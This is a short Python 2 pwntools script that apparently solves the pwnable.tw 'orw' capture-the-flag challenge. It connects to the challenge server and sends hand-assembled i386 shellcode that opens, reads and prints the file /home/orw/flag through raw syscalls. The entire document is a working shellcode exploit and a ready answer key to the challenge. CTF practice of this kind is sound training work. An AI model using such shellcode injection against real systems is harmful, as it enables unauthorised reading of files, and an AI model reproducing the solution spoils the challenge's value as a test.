#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = connect('chall.pwnable.tw', 10001)
else:
    conn = process('/home/doublesine/Desktop/orw')

print(conn.read())

shellcode =  asm('xor ecx, ecx')
shellcode += asm('xor edx, edx')
shellcode += asm('push 0x' + 'ag\x00\x00'[::-1].encode('hex'))
shellcode += asm('push 0x' + 'w/fl'[::-1].encode('hex'))
shellcode += asm('push 0x' + 'e/or'[::-1].encode('hex'))
shellcode += asm('push 0x' + '/hom'[::-1].encode('hex'))
shellcode += asm('mov ebx, esp')
shellcode += asm('mov eax, 0x5')
shellcode += asm('int 0x80')

shellcode += asm('push eax')
shellcode += asm('mov ebx, eax')
shellcode += asm('mov edx, 0x80')
shellcode += asm('sub esp, 0x80')
shellcode += asm('mov ecx, esp')
shellcode += asm('mov eax, 0x3')
shellcode += asm('int 0x80')

shellcode += asm('mov ebx, 0x1')
shellcode += asm('mov ecx, esp')
shellcode += asm('mov edx, 0x80')
shellcode += asm('mov eax, 0x4')
shellcode += asm('int 0x80')

conn.send(shellcode)
print(conn.read())
conn.close()
